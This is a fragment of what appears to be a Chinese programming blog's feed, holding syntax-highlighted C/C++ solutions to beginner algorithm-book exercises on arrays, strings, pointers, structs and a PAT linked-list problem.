class="line"><span class="comment">    fibo[0]=1;</span></span><br><span class="line"><span class="comment">    fibo[1]=1;</span></span><br><span class="line"><span class="comment">    for(int i=2;i&lt;20;i++)&#123;</span></span><br><span class="line"><span class="comment">        fibo[i]=fibo[i-1]+fibo[i-2];</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;20;i++)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d\n&quot;,fibo[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">E</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	char str1[50],str2[50];</span></span><br><span class="line"><span class="comment">	memset(str1,0,sizeof(str1));</span></span><br><span class="line"><span class="comment">	memset(str2,0,sizeof(str1));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	gets(str1);</span></span><br><span class="line"><span class="comment">	gets(str2);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	for(int i=0;i&lt;strlen(str1);i++)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		if(str1[i] != str2[i])</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			printf(&quot;%d\n&quot;,str1[i] - str2[i]);</span></span><br><span class="line"><span class="comment">			return 0;</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		else</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			if(i==strlen(str1)-1)</span></span><br><span class="line"><span class="comment">				printf(&quot;0\n&quot;);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">E</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char str[20];</span></span><br><span class="line"><span class="comment">    //char temp1=&#x27;Z&#x27;;</span></span><br><span class="line"><span class="comment">    //printf(&quot;%d\n&quot;,(int)&#x27;Z&#x27;);</span></span><br><span class="line"><span class="comment">    //char temp2=&#x27;z&#x27;;</span></span><br><span class="line"><span class="comment">    //printf(&quot;%d\n&quot;,(int)temp2);</span></span><br><span class="line"><span class="comment">    gets(str);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;20;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(str[i]&lt;=&#x27;Z&#x27;&amp;&amp;str[i]&gt;=&#x27;A&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            str[i]=(int)&#x27;Z&#x27;-((int)str[i]-(int)&#x27;A&#x27;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if(str[i]&lt;=&#x27;z&#x27;&amp;&amp;str[i]&gt;=&#x27;a&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            str[i]=(int)&#x27;z&#x27;-(int)str[i]+(int)&#x27;a&#x27;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    puts(str);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">D</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n,i,j,a[100];</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;n);  //行数</span></span><br><span class="line"><span class="comment">    printf(&quot;1&quot;);</span></span><br><span class="line"><span class="comment">    printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    a[1]=a[2]=1;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d %d\n&quot;,a[1],a[2]);</span></span><br><span class="line"><span class="comment">    for(i=3;i&lt;=n;i++)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        a[1]=a[i]=1;</span></span><br><span class="line"><span class="comment">        for(j=i-1;j&gt;1;j--)</span></span><br><span class="line"><span class="comment">            a[j]=a[j]+a[j-1];</span></span><br><span class="line"><span class="comment">        for(j=1;j&lt;=i;j++)</span></span><br><span class="line"><span class="comment">            printf(&quot;%d &quot;,a[j]);</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">B</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int a[10];</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;10;i++)</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;a[i]);</span></span><br><span class="line"><span class="comment">    for(int i=9;i&gt;=0;i--)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d\n&quot;,a[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int a[10];</span></span><br><span class="line"><span class="comment">    int b;</span></span><br><span class="line"><span class="comment">    memset(a,0,sizeof(a));</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;9;i++)</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;a[i]);</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;b);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(b&gt;=a[i]&amp;&amp;b&lt;=a[i+1]&amp;&amp;i&lt;9)&#123;</span></span><br><span class="line"><span class="comment">            for(int j=9;j&gt;(i+1);j--)</span></span><br><span class="line"><span class="comment">                a[j]=a[j-1];</span></span><br><span class="line"><span class="comment">            a[i+1]=b;</span></span><br><span class="line"><span class="comment">            break;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else</span></span><br><span class="line"><span class="comment">            a[9]=b;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;10;i++)</span></span><br><span class="line"><span class="comment">        printf(&quot;%d\n&quot;,a[i]);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-6"><a href="#2-6" class="headerlink" title="2.6"></a>2.6</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//B</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_AEIOU</span><span class="params">(<span class="keyword">char</span> a[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="string">&#x27;a&#x27;</span>||a[i]==<span class="string">&#x27;e&#x27;</span>||a[i]==<span class="string">&#x27;i&#x27;</span>||a[i]==<span class="string">&#x27;o&#x27;</span>||a[i]==<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">20</span>];</span><br><span class="line">    gets(a);</span><br><span class="line">    <span class="keyword">int</span> n=<span class="built_in">strlen</span>(a);</span><br><span class="line">    find_AEIOU(a,n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">void reverse(char a[],int n)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    for(int i=n-1;i&gt;=0;i--)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%c&quot;,a[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char a[20];</span></span><br><span class="line"><span class="comment">    gets(a);</span></span><br><span class="line"><span class="comment">    int n=strlen(a);</span></span><br><span class="line"><span class="comment">    reverse(a,n);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-7"><a href="#2-7" class="headerlink" title="2.7"></a>2.7</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//E</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">(<span class="keyword">int</span> a[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=<span class="number">9</span>; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exe</span><span class="params">(<span class="keyword">int</span> a[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *p=a, i, temp, min, max;</span><br><span class="line">    min = a[<span class="number">0</span>];</span><br><span class="line">    max = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (min &gt; *(p + i))</span><br><span class="line">            min = *(p + i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*(p + i) == min)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = *(p + i);</span><br><span class="line">            *(p + i) = *p;</span><br><span class="line">            *p = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (max &lt; *(p + i))</span><br><span class="line">            max = *(p + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*(p + i) == max)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = *(p + i);</span><br><span class="line">            *(p + i) = *(p + <span class="number">9</span>);</span><br><span class="line">            *(p + <span class="number">9</span>) = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> a[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *p, i;</span><br><span class="line">    p = a;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *&amp;a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">20</span>];</span><br><span class="line">    input(a);</span><br><span class="line">    exe(a);</span><br><span class="line">    output(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">D</span></span><br><span class="line"><span class="comment">void swap(char *a, char *b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	char temp[20];</span></span><br><span class="line"><span class="comment">	strcpy(temp,a);</span></span><br><span class="line"><span class="comment">	strcpy(a,b);</span></span><br><span class="line"><span class="comment">	strcpy(b,temp);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	char a[20],b[20],c[20];</span></span><br><span class="line"><span class="comment">	gets(a);gets(b);gets(c);</span></span><br><span class="line"><span class="comment">	char *s1=a, *s2=b, *s3=c;</span></span><br><span class="line"><span class="comment">	if(strcmp(s1,s3)&gt;0) swap(s1,s3);</span></span><br><span class="line"><span class="comment">	if(strcmp(s2,s3)&gt;0) swap(s2,s3);</span></span><br><span class="line"><span class="comment">	if(strcmp(s1,s2)&gt;0) swap(s1,s2);</span></span><br><span class="line"><span class="comment">	puts(s1);puts(s2);puts(s3);</span></span><br><span class="line"><span class="comment">	return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">C</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char* a = &quot;I love China!&quot;;</span></span><br><span class="line"><span class="comment">    int n;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;n);  //0&lt;=n&lt;=12</span></span><br><span class="line"><span class="comment">    for(int i=n;i&lt;13;i++)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%c&quot;,*(a+i));</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">B</span></span><br><span class="line"><span class="comment">void cmp(int *p, int *q)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	if(*p &lt; *q)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		int temp = *p;</span></span><br><span class="line"><span class="comment">		*p = *q;</span></span><br><span class="line"><span class="comment">		*q = temp;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	int a,b,c;</span></span><br><span class="line"><span class="comment">	scanf(&quot;%d %d %d&quot;, &amp;a, &amp;b, &amp;c);</span></span><br><span class="line"><span class="comment">	cmp(&amp;a, &amp;c);</span></span><br><span class="line"><span class="comment">	cmp(&amp;a, &amp;b);</span></span><br><span class="line"><span class="comment">	cmp(&amp;b, &amp;c);</span></span><br><span class="line"><span class="comment">	printf(&quot;%d %d %d\n&quot;, a, b, c);</span></span><br><span class="line"><span class="comment">	return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">void judge(int* a,int* b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int temp1 = max(*a,*b);</span></span><br><span class="line"><span class="comment">    int temp2 = min(*a,*b);</span></span><br><span class="line"><span class="comment">    printf(&quot;%d %d&quot;,temp1,temp2);</span></span><br><span class="line"><span class="comment">    return ;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int a;</span></span><br><span class="line"><span class="comment">    int b;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span></span><br><span class="line"><span class="comment">    judge(&amp;a,&amp;b);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-8"><a href="#2-8" class="headerlink" title="2.8"></a>2.8</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//E</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> grade1,grade2,grade3;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Student stu[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	   <span class="built_in">scanf</span>(<span class="string">&quot;%d %s %d %d %d&quot;</span>,&amp;stu[i].num,stu[i].name,&amp;stu[i].grade1,&amp;stu[i].grade2,&amp;stu[i].grade3);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">double</span> totalG1,totalG2,totalG3;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	    totalG1+=stu[i].grade1;</span><br><span class="line">	    totalG2+=stu[i].grade2;</span><br><span class="line">	    totalG3+=stu[i].grade3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> AveG1,AveG2,AveG3;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%.2f &quot;</span>,AveG1=totalG1/<span class="number">10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%.2f &quot;</span>,AveG2=totalG2/<span class="number">10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>,AveG3=totalG3/<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">int</span> average[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;j++)</span><br><span class="line">	&#123;</span><br><span class="line">	  average[j]=(stu[j].grade1+stu[j].grade2+stu[j].grade3)/<span class="number">3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> highest=average[<span class="number">0</span>],count=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">10</span>;k++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(highest&lt;average[k])</span><br><span class="line">		&#123;</span><br><span class="line">		   highest=average[k];count=k;</span><br><span class="line">	    &#125;</span><br><span class="line">   	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %s %d %d %d&quot;</span>,stu[count].num,stu[count].name,stu[count].grade1,stu[count].grade2,stu[count].grade3);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">C</span></span><br><span class="line"><span class="comment">struct Data</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int num;</span></span><br><span class="line"><span class="comment">    char name[20];</span></span><br><span class="line"><span class="comment">    char sex;</span></span><br><span class="line"><span class="comment">    char job;</span></span><br><span class="line"><span class="comment">    union</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        int clas;</span></span><br><span class="line"><span class="comment">        char position[10];</span></span><br><span class="line"><span class="comment">    &#125;category;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n,i;</span></span><br><span class="line"><span class="comment">    struct Data da[100];</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;n);</span></span><br><span class="line"><span class="comment">    for(i=0;i&lt;n;i++)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d %s %c %c&quot;,&amp;da[i].num,&amp;da[i].name,&amp;da[i].sex,&amp;da[i].job);</span></span><br><span class="line"><span class="comment">       if(da[i].job==&#x27;s&#x27;)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            scanf(&quot;%d&quot;,&amp;da[i].category.clas);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else</span></span><br><span class="line"><span class="comment">            scanf(&quot;%s&quot;,da[i].category.position);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(i=0;i&lt;n;i++)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        if(da[i].job==&#x27;s&#x27;)</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">              printf(&quot;%d %s %c %c %d\n&quot;,da[i].num,da[i].name,da[i].sex,da[i].job,da[i].category.clas);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        else</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">              printf(&quot;%d %s %c %c %s\n&quot;,da[i].num,da[i].name,da[i].sex,da[i].job,da[i].category.position);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法笔记_第七章</title>
    <url>/2020/02/12/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%83%E7%AB%A0/</url>
    <content><![CDATA[<p>第七章书上的题目+上机训练</p>
<span id="more"></span>

<h2 id="7-书"><a href="#7-书" class="headerlink" title="7(书)"></a>7(书)</h2><h3 id="7-3"><a href="#7-3" class="headerlink" title="7.3"></a>7.3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1052</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> address;</span><br><span class="line">    <span class="keyword">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line">&#125;node[<span class="number">100001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(Node a,Node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.flag==<span class="literal">false</span>||b.flag==<span class="literal">false</span>) <span class="keyword">return</span> a.flag&gt;b.flag;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> a.key&lt;b.key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,head;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;head);</span><br><span class="line">    <span class="keyword">int</span> address,next,key;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span 